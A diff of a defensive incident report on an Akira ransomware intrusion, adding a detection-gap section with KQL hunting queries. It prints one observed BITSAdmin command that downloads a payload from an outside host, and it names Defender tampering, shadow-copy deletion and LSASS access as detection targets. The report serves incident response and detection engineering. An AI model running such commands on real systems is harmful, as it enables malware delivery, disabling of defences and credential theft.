@@ -1,4 +1,4 @@
-# Sentinel Threat Hunt - The Buyer — Akira Ransomware Incident Reconstruction
+# Sentinel Threat Hunt — Akira Ransomware Incident Reconstruction
 
 > All investigation screenshots and artifacts are stored in the `/evidence` directory.
 
@@ -14,7 +14,7 @@ The investigation began with Defender alerts indicating suspicious PowerShell ac
 - `advanced_ip_scanner.exe`
 - `wsync.exe`
 
-Further analysis revealed a full attack lifecycle including:
+Further analysis revealed a full attack lifecycle involving:
 
 - internal reconnaissance
 - credential access
@@ -22,7 +22,7 @@ Further analysis revealed a full attack lifecycle including:
 - data staging
 - ransomware deployment
 
-Two systems were involved in the intrusion:
+Two systems were involved:
 
 | System | Role |
 |------|------|
@@ -144,7 +144,7 @@ A suspicious binary named **wsync.exe** was downloaded and executed from:
 C:\ProgramData\wsync.exe
 ```
 
-This executable acted as a **command and control beacon**.
+This executable acted as a **command-and-control beacon**.
 
 ---
 
@@ -283,8 +283,9 @@ T1021 — Remote Services
 Once on the server, the attacker executed several tools including:
 
 - AnyDesk
-- data compression utilities
-- ransomware payload
+- network enumeration
+- archive creation
+- ransomware execution
 
 ---
 
@@ -360,9 +361,9 @@ T1486 — Data Encrypted for Impact
 
 ---
 
-# Process Lineage
+# Process Lineage Reconstruction
 
-The reconstructed process tree shows the attack lifecycle.
+The reconstructed process tree shows the full attack lifecycle.
 
 ```
 explorer.exe
@@ -395,8 +396,6 @@ Impact | T1486 — Ransomware |
 # Detection Engineering
 
 The following KQL detections could identify similar activity in the future.
-
----
 
 ### Detect BITS Malware Downloads
 
@@ -439,7 +438,7 @@ DeviceEvents
 
 ---
 
-### Detect Data Staging
+### Detect Suspicious Archive Creation
 
 ```kql
 DeviceFileEvents
@@ -449,21 +448,90 @@ DeviceFileEvents
 
 ---
 
+# Detection Coverage Gap Analysis
+
+During this investigation several attacker behaviors occurred without triggering preventative controls.
+
+The following detection gaps were identified.
+
+---
+
+## Living-off-the-Land Binary Abuse
+
+The attacker used **BITSAdmin** to download malicious tooling.
+
+Observed command:
+
+```
+bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe
+```
+
+Recommended detection:
+
+```kql
+DeviceProcessEvents
+| where FileName == "bitsadmin.exe"
+| where ProcessCommandLine contains "http"
+```
+
+---
+
+## Defender Tampering
+
+Security controls were disabled prior to further attack activity.
+
+Recommended detection:
+
+```kql
+DeviceProcessEvents
+| where ProcessCommandLine contains "Set-MpPreference"
+```
+
+---
+
+## Shadow Copy Deletion
+
+Shadow copies were deleted before ransomware deployment.
+
+Recommended detection:
+
+```kql
+DeviceProcessEvents
+| where ProcessCommandLine contains "shadowcopy"
+or ProcessCommandLine contains "vssadmin delete"
+```
+
+---
+
+## Credential Dumping Indicators
+
+LSASS memory access occurred without triggering high-confidence alerts.
+
+Recommended detection:
+
+```kql
+DeviceEvents
+| where ActionType == "NamedPipeEvent"
+| where AdditionalFields contains "lsass"
+```
+
+---
+
 # Conclusion
 
-This investigation reconstructed a **human-operated ransomware attack** using Microsoft Defender telemetry and Sentinel queries.
+This investigation reconstructed a **human-operated ransomware intrusion** using Microsoft Defender telemetry and Sentinel queries.
 
 The attacker:
 
-1. gained access via compromised credentials
-2. performed reconnaissance using Advanced IP Scanner
-3. deployed malware using BITSAdmin
-4. executed a command-and-control beacon (`wsync.exe`)
-5. disabled security controls
-6. accessed LSASS memory
-7. pivoted laterally to AS-SRV
-8. staged data for exfiltration
-9. cleared logs
+1. gained access via compromised credentials  
+2. conducted reconnaissance using Advanced IP Scanner  
+3. downloaded tooling via BITSAdmin  
+4. deployed a command-and-control beacon (`wsync.exe`)  
+5. disabled Microsoft Defender protections  
+6. accessed LSASS memory for credential harvesting  
+7. pivoted laterally to AS-SRV  
+8. staged data for exfiltration  
+9. cleared system logs  
 10. deployed Akira ransomware
 
-This investigation demonstrates how **endpoint telemetry and threat hunting techniques can reconstruct attacker behavior and improve defensive detection capabilities.**
+This investigation demonstrates how **endpoint telemetry and proactive threat hunting techniques can reconstruct attacker behavior and inform defensive improvements.**
